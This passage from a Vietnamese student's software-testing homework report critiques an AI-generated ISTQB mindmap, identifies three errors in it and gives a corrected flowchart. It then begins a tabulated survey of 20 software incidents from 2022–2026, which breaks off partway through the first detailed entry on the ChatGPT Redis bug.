+    Core --&gt; ColQA[&quot;TRỤ CỘT 1: ĐẢM BẢO CHẤT LƯỢNG (QA)&lt;br/&gt;&lt;i&gt;Định hướng Quy trình · Phòng ngừa lỗi từ sớm&lt;/i&gt;&quot;]:::qaStyle
+    Core --&gt; ColQC[&quot;TRỤ CỘT 2: KIỂM SOÁT CHẤT LƯỢNG (QC)&lt;br/&gt;&lt;i&gt;Định hướng Sản phẩm · Phát hiện và xác minh lỗi&lt;/i&gt;&quot;]:::qcStyle
+
+    %% Chi tiết QA
+    ColQA --&gt; QA_Act1[&quot;Xây dựng tiêu chuẩn &amp; quy trình phát triển phần mềm&quot;]
+    ColQA --&gt; QA_Act2[&quot;Đánh giá tuân thủ quy trình (Quality Audits &amp; Compliance)&quot;]
+    ColQA --&gt; QA_Act3[&quot;Phân tích nguyên nhân gốc rễ lỗi (Root Cause Analysis)&quot;]
+    ColQA --&gt; QA_Act4[&quot;Cải tiến quy trình liên tục (Continuous Process Improvement)&quot;]
+
+    %% Chi tiết QC &amp; Testing
+    ColQC --&gt; QC_Act1[&quot;Kiểm tra sản phẩm trung gian (Inspection &amp; Reviews)&quot;]
+    ColQC --&gt; QC_Act2[&quot;Hoạt động Kiểm thử phần mềm (Testing Activities)&quot;]
+
+    %% Hai nhánh kiểm thử
+    QC_Act2 --&gt; StaticBranch[&quot;KIỂM THỬ TĨNH (Static Testing)&lt;br/&gt;&lt;i&gt;Rà soát tài liệu &amp; Quét mã nguồn không cần chạy&lt;/i&gt;&quot;]:::staticStyle
+    QC_Act2 --&gt; DynamicBranch[&quot;KIỂM THỬ ĐỘNG (Dynamic Testing)&lt;br/&gt;&lt;i&gt;Chạy phần mềm với các bộ dữ liệu đầu vào&lt;/i&gt;&quot;]:::dynamicStyle
+
+    StaticBranch --&gt; ST1[&quot;Reviews: Informal, Walkthrough, Technical, Inspection&quot;]
+    StaticBranch --&gt; ST2[&quot;Static Analysis: Linter, SonarQube, SAST Tools&quot;]
+
+    DynamicBranch --&gt; DT1[&quot;Kiểm thử Chức năng (Functional Testing)&quot;]
+    DynamicBranch --&gt; DT2[&quot;Kiểm thử Phi chức năng (Performance, Security, Reliability)&quot;]
+    DynamicBranch --&gt; DT3[&quot;Kiểm thử Hồi quy &amp; Xác nhận sửa lỗi (Regression &amp; Confirmation)&quot;]
+
+    %% Quy trình kiểm thử chuẩn ISTQB v4.0
+    Core ==&gt; ProcessRoot[&quot;QUY TRÌNH KIỂM THỬ CHUẨN ISTQB (7 Hoạt động)&quot;]:::processStyle
+
+    subgraph OngoingActivity [&quot;HOẠT ĐỘNG ĐIỀU HÀNH XUYÊN SUỐT (Chạy song song 100% thời gian)&quot;]
+        Monitoring[&quot;GIÁM SÁT VÀ KIỂM SOÁT KIỂM THỬ (Test Monitoring &amp; Control)&lt;br/&gt;&lt;i&gt;Liên tục đối chiếu tiến độ với mục tiêu và đưa ra chỉ đạo khắc phục&lt;/i&gt;&quot;]:::monitorStyle
+    end
+
+    subgraph SequentialWorkflow [&quot;6 PHA THỰC THI KIỂM THỬ TUẦN TỰ&quot;]
+        direction TB
+        Step1[&quot;Pha 1: Lập kế hoạch (Test Planning)&lt;br/&gt;&lt;i&gt;Xác định mục tiêu, phạm vi, rủi ro, dự toán nguồn lực&lt;/i&gt;&quot;]
+        Step2[&quot;Pha 2: Phân tích kiểm thử (Test Analysis)&lt;br/&gt;&lt;i&gt;Phân tích cơ sở kiểm thử - Xác định CÁI GÌ cần test&lt;/i&gt;&quot;]
+        Step3[&quot;Pha 3: Thiết kế kiểm thử (Test Design)&lt;br/&gt;&lt;i&gt;Thiết kế Test Cases và chuẩn bị dữ liệu - Test NHƯ THẾ NÀO&lt;/i&gt;&quot;]
+        Step4[&quot;Pha 4: Cài đặt kiểm thử (Test Implementation)&lt;br/&gt;&lt;i&gt;Chuẩn bị môi trường, kịch bản tự động, bộ test suites&lt;/i&gt;&quot;]
+        Step5[&quot;Pha 5: Thực thi kiểm thử (Test Execution)&lt;br/&gt;&lt;i&gt;Chạy kịch bản kiểm thử, so sánh kết quả và ghi nhận Bug&lt;/i&gt;&quot;]
+        Step6[&quot;Pha 6: Đóng kiểm thử (Test Completion)&lt;br/&gt;&lt;i&gt;Đánh giá tiêu chí dừng, tổng kết bàn giao, lưu trữ tài sản&lt;/i&gt;&quot;]
+
+        Step1 --&gt; Step2 --&gt; Step3 --&gt; Step4 --&gt; Step5 --&gt; Step6
+    end
+
+    ProcessRoot --&gt; OngoingActivity
+    ProcessRoot --&gt; SequentialWorkflow
+    Monitoring -.-&gt;|Giám sát &amp; Chỉ đạo liên tục| SequentialWorkflow
+
+    %% Định nghĩa màu sắc hiển thị
+    classDef coreStyle fill:#0F172A,stroke:#38BDF8,stroke-width:2px,color:#F8FAFC,font-weight:bold
+    classDef qaStyle fill:#0369A1,stroke:#0284C7,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef qcStyle fill:#0F766E,stroke:#0D9488,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef processStyle fill:#4338CA,stroke:#6366F1,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef monitorStyle fill:#991B1B,stroke:#EF4444,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef staticStyle fill:#D97706,stroke:#F59E0B,stroke-width:1px,color:#FFFFFF
+    classDef dynamicStyle fill:#15803D,stroke:#22C55E,stroke-width:1px,color:#FFFFFF
+</code></pre>
+<hr />
+<h1>Báo cáo Sơ đồ tư duy Quy trình ISTQB &amp; Hoạt động CLO G9.1</h1>
+<p><strong>Bài tập:</strong> HW01 – Yêu cầu 1 (Chuẩn đánh giá CLO G9.1)<br />
+<strong>Tiêu chuẩn đối chiếu:</strong> ISTQB Certified Tester Foundation Level (CTFL) Syllabus v4.0  </p>
+<hr />
+<h2>1. Ngữ cảnh &amp; Câu lệnh gửi cho AI (Prompt Sent to AI Tool)</h2>
+<p>Để thực hiện chuẩn đầu ra <strong>CLO G9.1</strong> (<em>Yêu cầu AI vẽ sơ đồ tư duy về quy trình kiểm thử chuẩn ISTQB và chỉ ra 3 lỗi sai</em>), tôi đã gửi câu lệnh sau đến công cụ AI (Gemini / ChatGPT):</p>
+<blockquote>
+<p><strong>Prompt:</strong><br />
+<em>"Đóng vai trò là một chuyên gia kiểm thử phần mềm, hãy vẽ một sơ đồ tư duy (mindmap) bằng cú pháp Mermaid mô tả chi tiết: (1) Sự khác biệt giữa vai trò của QA và QC trong dự án, (2) Các cấp độ và loại kiểm thử chính, và (3) Toàn bộ các bước tuần tự trong quy trình kiểm thử phần mềm chuẩn theo giáo trình ISTQB mới nhất."</em></p>
+</blockquote>
+<hr />
+<h2>2. Kết quả thô do AI tạo ra (Raw AI-Generated Mindmap)</h2>
+<p>Dưới đây là sơ đồ thô nguyên bản do mô hình AI sinh ra:</p>
+<pre><code class="language-mermaid">mindmap
+  root((Hệ thống Kiểm thử Phần mềm))
+    Phân định Vai trò
+      QA:: Đảm bảo chất lượng: Chạy kịch bản test tự động và tìm lỗi phần mềm
+      QC:: Kiểm soát chất lượng: Soạn thảo văn bản quy trình và đào tạo nhân sự
+    Phân loại Kiểm thử
+      Kỹ thuật kiểm thử
+        Kiểm thử hộp đen (Black-box)
+        Kiểm thử hộp trắng (White-box)
+      Cấp độ kiểm thử
+        Unit Test
+        Integration Test
+        System Test
+        UAT Test
+    Quy trình Kiểm thử Tuần tự
+      Bước 1: Lập kế hoạch kiểm thử (Test Planning)
+      Bước 2: Thiết kế kịch bản kiểm thử (Test Design)
+      Bước 3: Thực thi kiểm thử (Test Execution)
+      Bước 4: Báo cáo lỗi &amp; Đóng dự án (Defect Reporting &amp; Sign-off)
+      Bước 5: Giám sát kiểm thử (Test Monitoring)
+</code></pre>
+<hr />
+<h2>3. Phân tích phản biện: 3 sai sót trọng yếu của AI đối chiếu theo ISTQB CTFL v4.0</h2>
+<p>Khi đối chiếu sơ đồ trên với tài liệu chuẩn quốc tế <strong>ISTQB CTFL phiên bản 4.0</strong>, tôi phát hiện 3 lỗi sai/thiếu sót mang tính bản chất kỹ thuật:</p>
+<h3>💡 Lỗi 1: Đảo lộn hoàn toàn định nghĩa và trách nhiệm giữa QA và QC (Mục 1.2.2)</h3>
+<ul>
+<li><strong>Sai sót của AI:</strong> AI mô tả <strong>QA</strong> là <em>"Chạy kịch bản test tự động và tìm lỗi"</em> (tập trung vào sản phẩm), trong khi lại gán <strong>QC</strong> là <em>"Soạn thảo quy trình và đào tạo"</em> (tập trung vào quy trình).</li>
+<li><strong>Cơ sở lý thuyết chuẩn ISTQB v4.0:</strong> </li>
+<li><strong>QA (Quality Assurance):</strong> Hoạt động định hướng quy trình (<strong>process-oriented</strong>), mang tính chất <strong>phòng ngừa (preventive)</strong>. QA tập trung vào việc định nghĩa, đánh giá (audit) và cải tiến liên tục quy trình phát triển nhằm ngăn ngừa khuyết tật sinh ra ngay từ đầu.</li>
+<li><strong>QC (Quality Control):</strong> Hoạt động định hướng sản phẩm (<strong>product-oriented</strong>), mang tính chất <strong>phát hiện (corrective/detective)</strong>. QC sử dụng các kỹ thuật kiểm thử phần mềm để xác minh xem sản phẩm thực tế có thỏa mãn các yêu cầu đặc tả hay không.</li>
+<li><strong>Tác động thực tế:</strong> Việc hiểu sai này gây nhầm lẫn nghiêm trọng trong việc phân công công việc tại các doanh nghiệp công nghệ, biến kỹ sư QA thành thợ chạy test thuần túy thay vì người quản trị chất lượng quy trình.</li>
+</ul>
+<hr />
+<h3>💡 Lỗi 2: Bỏ qua 2 giai đoạn cốt lõi: Phân tích kiểm thử (Test Analysis) và Cài đặt kiểm thử (Test Implementation) (Mục 1.4.2)</h3>
+<ul>
+<li><strong>Sai sót của AI:</strong> Trong quy trình kiểm thử, AI nhảy cóc thẳng từ <em>Lập kế hoạch (Test Planning)</em> sang <em>Thiết kế kịch bản (Test Design)</em>, rồi từ Test Design chuyển ngay sang <em>Thực thi (Test Execution)</em>.</li>
+<li><strong>Cơ sở lý thuyết chuẩn ISTQB v4.0:</strong> Một quy trình kiểm thử chuẩn mực bắt buộc phải trải qua:<br />
+  1. <strong>Test Analysis (Phân tích kiểm thử):</strong> Phân tích cơ sở kiểm thử (Test Basis: User Stories, tài liệu kiến trúc) để xác định <strong>"CÁI GÌ CẦN ĐƯỢC KIỂM THỬ"</strong> (xác định Test Conditions).<br />
+  2. <strong>Test Implementation (Cài đặt kiểm thử):</strong> Chuẩn bị môi trường, sinh dữ liệu kiểm thử (Test Data), sắp xếp các quy trình test (Test Procedures) và viết mã tự động hóa (Automation Test Scripts) trước khi bắt đầu bấm chạy.</li>
+<li><strong>Tác động thực tế:</strong> Bỏ qua Test Analysis dẫn đến tình trạng viết test case mù quáng không dựa trên phân tích rủi ro yêu cầu; bỏ qua Test Implementation khiến việc thực thi bị động, thiếu dữ liệu và môi trường không ổn định.</li>
+</ul>
+<hr />
+<h3>💡 Lỗi 3: Xếp hoạt động Giám sát kiểm thử (Test Monitoring) thành bước tuần tự cuối cùng số 5 (Mục 1.4.1)</h3>
+<ul>
+<li><strong>Sai sót của AI:</strong> AI đặt <em>"Bước 5: Giám sát kiểm thử (Test Monitoring)"</em> ở vị trí cuối cùng, nằm sau cả bước báo cáo và đóng dự án (Sign-off).</li>
+<li><strong>Cơ sở lý thuyết chuẩn ISTQB v4.0:</strong> </li>
+<li><strong>Test Monitoring and Control</strong> là một <strong>hoạt động điều hành xuyên suốt (transversal/continuous activity)</strong>. </li>
+<li>Hoạt động này phải diễn ra <strong>song song và liên tục</strong> từ ngày đầu tiên bắt đầu lập kế hoạch (Test Planning) cho đến khi kết thúc toàn bộ dự án (Test Completion), nhằm đo lường tiến độ thực tế so với kế hoạch và kịp thời đưa ra biện pháp điều chỉnh (Control).</li>
+<li><strong>Tác động thực tế:</strong> Đợi đến khi bàn giao dự án mới đi "giám sát" là hoàn toàn vô nghĩa và phản khoa học trong quản lý kỹ thuật phần mềm.</li>
+</ul>
+<hr />
+<h2>4. Sơ đồ tư duy chuẩn hóa toàn diện theo ISTQB CTFL v4.0</h2>
+<p>Dưới đây là sơ đồ được tái cấu trúc chính xác, biểu diễn mối quan hệ tương hỗ giữa QA, QC và các giai đoạn kiểm thử theo đúng chuẩn quốc tế:</p>
+<pre><code class="language-mermaid">flowchart TD
+    %% Khối gốc
+    Core([&quot;HỆ THỐNG QUẢN LÝ CHẤT LƯỢNG TOÀN DIỆN&lt;br/&gt;(ISTQB CTFL v4.0 Quality Architecture)&quot;]):::coreStyle
+
+    %% Hai trụ cột chất lượng
+    Core --&gt; ColQA[&quot;TRỤ CỘT 1: ĐẢM BẢO CHẤT LƯỢNG (QA)&lt;br/&gt;&lt;i&gt;Định hướng Quy trình · Phòng ngừa lỗi từ sớm&lt;/i&gt;&quot;]:::qaStyle
+    Core --&gt; ColQC[&quot;TRỤ CỘT 2: KIỂM SOÁT CHẤT LƯỢNG (QC)&lt;br/&gt;&lt;i&gt;Định hướng Sản phẩm · Phát hiện và xác minh lỗi&lt;/i&gt;&quot;]:::qcStyle
+
+    %% Chi tiết QA
+    ColQA --&gt; QA_Act1[&quot;Xây dựng tiêu chuẩn &amp; quy trình phát triển phần mềm&quot;]
+    ColQA --&gt; QA_Act2[&quot;Đánh giá tuân thủ quy trình (Quality Audits &amp; Compliance)&quot;]
+    ColQA --&gt; QA_Act3[&quot;Phân tích nguyên nhân gốc rễ lỗi (Root Cause Analysis)&quot;]
+    ColQA --&gt; QA_Act4[&quot;Cải tiến quy trình liên tục (Continuous Process Improvement)&quot;]
+
+    %% Chi tiết QC &amp; Testing
+    ColQC --&gt; QC_Act1[&quot;Kiểm tra sản phẩm trung gian (Inspection &amp; Reviews)&quot;]
+    ColQC --&gt; QC_Act2[&quot;Hoạt động Kiểm thử phần mềm (Testing Activities)&quot;]
+
+    %% Hai nhánh kiểm thử
+    QC_Act2 --&gt; StaticBranch[&quot;KIỂM THỬ TĨNH (Static Testing)&lt;br/&gt;&lt;i&gt;Rà soát tài liệu &amp; Quét mã nguồn không cần chạy&lt;/i&gt;&quot;]:::staticStyle
+    QC_Act2 --&gt; DynamicBranch[&quot;KIỂM THỬ ĐỘNG (Dynamic Testing)&lt;br/&gt;&lt;i&gt;Chạy phần mềm với các bộ dữ liệu đầu vào&lt;/i&gt;&quot;]:::dynamicStyle
+
+    StaticBranch --&gt; ST1[&quot;Reviews: Informal, Walkthrough, Technical, Inspection&quot;]
+    StaticBranch --&gt; ST2[&quot;Static Analysis: Linter, SonarQube, SAST Tools&quot;]
+
+    DynamicBranch --&gt; DT1[&quot;Kiểm thử Chức năng (Functional Testing)&quot;]
+    DynamicBranch --&gt; DT2[&quot;Kiểm thử Phi chức năng (Performance, Security, Reliability)&quot;]
+    DynamicBranch --&gt; DT3[&quot;Kiểm thử Hồi quy &amp; Xác nhận sửa lỗi (Regression &amp; Confirmation)&quot;]
+
+    %% Quy trình kiểm thử chuẩn ISTQB v4.0
+    Core ==&gt; ProcessRoot[&quot;QUY TRÌNH KIỂM THỬ CHUẨN ISTQB (7 Hoạt động)&quot;]:::processStyle
+
+    subgraph OngoingActivity [&quot;HOẠT ĐỘNG ĐIỀU HÀNH XUYÊN SUỐT (Chạy song song 100% thời gian)&quot;]
+        Monitoring[&quot;GIÁM SÁT VÀ KIỂM SOÁT KIỂM THỬ (Test Monitoring &amp; Control)&lt;br/&gt;&lt;i&gt;Liên tục đối chiếu tiến độ với mục tiêu và đưa ra chỉ đạo khắc phục&lt;/i&gt;&quot;]:::monitorStyle
+    end
+
+    subgraph SequentialWorkflow [&quot;6 PHA THỰC THI KIỂM THỬ TUẦN TỰ&quot;]
+        direction TB
+        Step1[&quot;Pha 1: Lập kế hoạch (Test Planning)&lt;br/&gt;&lt;i&gt;Xác định mục tiêu, phạm vi, rủi ro, dự toán nguồn lực&lt;/i&gt;&quot;]
+        Step2[&quot;Pha 2: Phân tích kiểm thử (Test Analysis)&lt;br/&gt;&lt;i&gt;Phân tích cơ sở kiểm thử - Xác định CÁI GÌ cần test&lt;/i&gt;&quot;]
+        Step3[&quot;Pha 3: Thiết kế kiểm thử (Test Design)&lt;br/&gt;&lt;i&gt;Thiết kế Test Cases và chuẩn bị dữ liệu - Test NHƯ THẾ NÀO&lt;/i&gt;&quot;]
+        Step4[&quot;Pha 4: Cài đặt kiểm thử (Test Implementation)&lt;br/&gt;&lt;i&gt;Chuẩn bị môi trường, kịch bản tự động, bộ test suites&lt;/i&gt;&quot;]
+        Step5[&quot;Pha 5: Thực thi kiểm thử (Test Execution)&lt;br/&gt;&lt;i&gt;Chạy kịch bản kiểm thử, so sánh kết quả và ghi nhận Bug&lt;/i&gt;&quot;]
+        Step6[&quot;Pha 6: Đóng kiểm thử (Test Completion)&lt;br/&gt;&lt;i&gt;Đánh giá tiêu chí dừng, tổng kết bàn giao, lưu trữ tài sản&lt;/i&gt;&quot;]
+
+        Step1 --&gt; Step2 --&gt; Step3 --&gt; Step4 --&gt; Step5 --&gt; Step6
+    end
+
+    ProcessRoot --&gt; OngoingActivity
+    ProcessRoot --&gt; SequentialWorkflow
+    Monitoring -.-&gt;|Giám sát &amp; Chỉ đạo liên tục| SequentialWorkflow
+
+    %% Định nghĩa màu sắc hiển thị
+    classDef coreStyle fill:#0F172A,stroke:#38BDF8,stroke-width:2px,color:#F8FAFC,font-weight:bold
+    classDef qaStyle fill:#0369A1,stroke:#0284C7,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef qcStyle fill:#0F766E,stroke:#0D9488,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef processStyle fill:#4338CA,stroke:#6366F1,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef monitorStyle fill:#991B1B,stroke:#EF4444,stroke-width:2px,color:#FFFFFF,font-weight:bold
+    classDef staticStyle fill:#D97706,stroke:#F59E0B,stroke-width:1px,color:#FFFFFF
+    classDef dynamicStyle fill:#15803D,stroke:#22C55E,stroke-width:1px,color:#FFFFFF
+</code></pre>
+<hr />
+<h1>Requirement 2 – 20 Software Defects 2022–2026 (20 pts)</h1>
+<h2>2.1 Tổng quan &amp; Bảng phân loại 20 lỗi phần mềm (2022–2026)</h2>
+<p>Mục này phân tích 20 sự cố phần mềm nghiêm trọng được công bố rộng rãi trong giai đoạn từ năm 2022 đến 2026 trên nhiều lĩnh vực: Trí tuệ nhân tạo (AI/LLM), hạ tầng đám mây doanh nghiệp, an ninh chuỗi cung ứng, hệ điều hành và công nghệ ô tô.</p>
+<p>Tuân thủ nghiêm ngặt yêu cầu của đề bài:<br />
+- <strong>Có 5 lỗi liên quan trực tiếp đến AI/LLM</strong> (DEFECT-01 đến DEFECT-05): bao gồm rò rỉ dữ liệu qua Redis cache, nhân viên rò rỉ mã nguồn bán dẫn, thiên kiến sắc tộc thái quá trong tạo ảnh, lỗ hổng bộ lọc an toàn và tấn công Prompt Injection ẩn bằng ký tự Unicode.<br />
+- <strong>Yêu cầu BẮT BUỘC (NEW):</strong> Với <strong>TỪNG lỗi trong số 20 lỗi</strong>, bài báo cáo đều có mục phân tích <strong>AI Bias / Hallucination Analysis</strong> chỉ ra chính xác điểm mà các công cụ AI (ChatGPT, Claude, Gemini...) bị thiên kiến (bias), ảo giác (hallucination), thiếu sót (omission) hoặc nhầm lẫn nguyên nhân kỹ thuật khi được hỏi giải thích về sự cố đó (đủ 20 trường hợp).</p>
+<h3>Bảng tổng hợp 20 sự cố phần mềm tiêu biểu (2022–2026)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">ID</th>
+<th style="text-align: left;">Phần mềm / Sản phẩm</th>
+<th style="text-align: left;">Ngày công bố</th>
+<th style="text-align: left;">Phân loại</th>
+<th style="text-align: left;">Mức độ</th>
+<th style="text-align: left;">Phân loại Lỗi / Ảo giác của AI</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-01</strong></td>
+<td style="text-align: left;">OpenAI ChatGPT / Redis client library</td>
+<td style="text-align: left;">20/03/2023</td>
+<td style="text-align: left;">Data Privacy / AI Defect</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">AI Hallucination / Unsupported Claim</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-02</strong></td>
+<td style="text-align: left;">Samsung Semiconductor / ChatGPT</td>
+<td style="text-align: left;">04/2023</td>
+<td style="text-align: left;">AI Data Privacy / Corporate Leak</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">AI Hallucination / Omission</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-03</strong></td>
+<td style="text-align: left;">Google Gemini (formerly Bard)</td>
+<td style="text-align: left;">02/2024</td>
+<td style="text-align: left;">AI Bias / Diversity Overcorrection</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">AI Bias (Confirmed)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-04</strong></td>
+<td style="text-align: left;">Microsoft Copilot Designer</td>
+<td style="text-align: left;">12/2023</td>
+<td style="text-align: left;">AI Content Safety Filter Failure</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">AI Safety Failure / Minimization</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-05</strong></td>
+<td style="text-align: left;">GitHub Copilot (CVE-2025-53773 / CamoLeak)</td>
+<td style="text-align: left;">06/2025</td>
+<td style="text-align: left;">AI Prompt Injection / Data Exfiltration</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">AI Hallucination / Misclassification</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-06</strong></td>
+<td style="text-align: left;">CrowdStrike Falcon Sensor / Windows</td>
+<td style="text-align: left;">19/07/2024</td>
+<td style="text-align: left;">Software Update Defect / Memory Out-of-bounds</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Omission / Misattribution</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-07</strong></td>
+<td style="text-align: left;">Apache Log4j 2 (Log4Shell)</td>
+<td style="text-align: left;">12/2021 (Đỉnh điểm khai thác 2022)</td>
+<td style="text-align: left;">Security Vulnerability / RCE (JNDI)</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Unsupported Claim / Understatement</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-08</strong></td>
+<td style="text-align: left;">Spring Framework (Spring4Shell)</td>
+<td style="text-align: left;">31/03/2022</td>
+<td style="text-align: left;">Security Vulnerability / RCE (Class Loader)</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Hallucination / Conflation</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-09</strong></td>
+<td style="text-align: left;">Atlassian Confluence Server</td>
+<td style="text-align: left;">03/06/2022</td>
+<td style="text-align: left;">OGNL Injection / RCE</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Omission of Zero-Day Window</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-10</strong></td>
+<td style="text-align: left;">Microsoft Windows MSDT (Follina)</td>
+<td style="text-align: left;">30/05/2022</td>
+<td style="text-align: left;">Zero-Day RCE via Word / URL Protocol</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">Hallucination on Macro Requirement</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-11</strong></td>
+<td style="text-align: left;">OpenAI ChatGPT &amp; API Infrastructure</td>
+<td style="text-align: left;">11/12/2024</td>
+<td style="text-align: left;">Service Outage / Misconfiguration</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">Omission of Systemic Downtime Trends</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-12</strong></td>
+<td style="text-align: left;">Volkswagen Automotive Software (ID Series)</td>
+<td style="text-align: left;">2024</td>
+<td style="text-align: left;">Automotive Safety / Embedded Software</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Unsupported Claim / Root Cause Shift</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-13</strong></td>
+<td style="text-align: left;">Google Chrome (CVE-2022-0609)</td>
+<td style="text-align: left;">14/02/2022</td>
+<td style="text-align: left;">Use-After-Free / Animation Engine</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">Hallucination of Affected Component (V8)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-14</strong></td>
+<td style="text-align: left;">Apple WebKit (CVE-2022-22620)</td>
+<td style="text-align: left;">10/02/2022</td>
+<td style="text-align: left;">Use-After-Free / Zero-Day Web Engine</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Omission of Impact on All iOS Browsers</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-15</strong></td>
+<td style="text-align: left;">Twitter / X Platform API Scraping</td>
+<td style="text-align: left;">01/2022 (Rò rỉ dữ liệu 01/2023)</td>
+<td style="text-align: left;">API Data Enumeration / Leak</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">Unsupported Claim / Causal Fallacy</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-16</strong></td>
+<td style="text-align: left;">MOVEit Transfer (Progress Software)</td>
+<td style="text-align: left;">31/05/2023</td>
+<td style="text-align: left;">SQL Injection / Mass Extortion Campaign</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Unsupported Claim / Ransomware Fallacy</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-17</strong></td>
+<td style="text-align: left;">3CX Desktop App Supply Chain</td>
+<td style="text-align: left;">29/03/2023</td>
+<td style="text-align: left;">Supply Chain Attack / Signed Malware</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Hallucination of Phishing Vector</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-18</strong></td>
+<td style="text-align: left;">Okta Identity Support System</td>
+<td style="text-align: left;">19/10/2023</td>
+<td style="text-align: left;">Support Ticket Breach / HAR Token Leak</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">Omission of Scope Minimization</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-19</strong></td>
+<td style="text-align: left;">WinRAR Archive Handling (CVE-2023-38831)</td>
+<td style="text-align: left;">23/08/2023</td>
+<td style="text-align: left;">Arbitrary Code Execution / File Extension Spoof</td>
+<td style="text-align: left;">High</td>
+<td style="text-align: left;">Unsupported Claim of Extraction Trigger</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>DEFECT-20</strong></td>
+<td style="text-align: left;">Progress Telerik UI for ASP.NET AJAX</td>
+<td style="text-align: left;">09/2024</td>
+<td style="text-align: left;">Insecure Deserialization / RCE</td>
+<td style="text-align: left;">Critical</td>
+<td style="text-align: left;">Hallucination / Conflation with 2019 Bug</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>2.2 Phân tích chi tiết 20 lỗi phần mềm</h2>
+<hr />
+<h3>DEFECT-01 — AI/LLM: OpenAI ChatGPT / Redis Client Library Bug</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> OpenAI ChatGPT / Thư viện máy khách <code>redis-py</code></li>
+<li><strong>Phiên bản:</strong> ChatGPT (Tháng 03/2023)</li>
+<li><strong>Ngày công bố:</strong> 20/03/2023</li>
+<li><strong>Nguồn:</strong> Blog kỹ thuật chính thức của OpenAI</li>
+<li><strong>URL:</strong> <a href="https://openai.com/blog/march-20-chatgpt-outage">https://openai.com/blog/march-20-chatgpt-outage</a></li>
+<li><strong>Phân loại:</strong> Data Privacy / Software Defect (AI System)</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Làm lộ thông tin lịch sử trò chuyện và thông tin thanh toán (họ tên, email, 4 số cuối thẻ tín dụng, ngày hết hạn) của khoảng 1.2% thuê bao trả phí ChatGPT Plus.</li>
+<li><strong>Mô tả sự cố:</strong> Một lỗi tương tranh (race condition) xuất hiện trong thư viện open-source <code>redis-py</code> ở chế độ kết nối bất đồng bộ (async). Khi một request bị hủy bỏ, kết nối Redis không được xóa sạch dữ liệu đệm, dẫn đến việc dữ liệu phản hồi của một người dùng bị gán nhầm cho request của một người dùng khác trong pool kết nối.</li>
+<li><strong>Hậu quả:</strong> Người dùng thấy tiêu đề và tin nhắn mở đầu cuộc trò chuyện của người lạ; khoảng 100,000 tài khoản trả phí bị lộ thông tin thanh toán; OpenAI phải đóng cổng ChatGPT khẩn cấp trong gần 10 giờ.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> ~1.2% người dùng ChatGPT Plus đang hoạt động trong khung giờ xảy ra lỗi.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Lỗi bất đồng bộ trong việc quản lý bộ đệm của Redis client library khi chịu tải kết nối đồng thời cao.</li>
+<li><strong>Giải pháp (Solution):</strong> OpenAI gỡ phiên bản thư viện lỗi, đưa ra bản vá cho <code>redis-py</code>, thêm cơ chế xác thực kép cho session trước khi trả dữ liệu về client, và gửi email cảnh báo tới các nạn nhân.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 03/2023).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> AI Hallucination / Unsupported Claim</li>
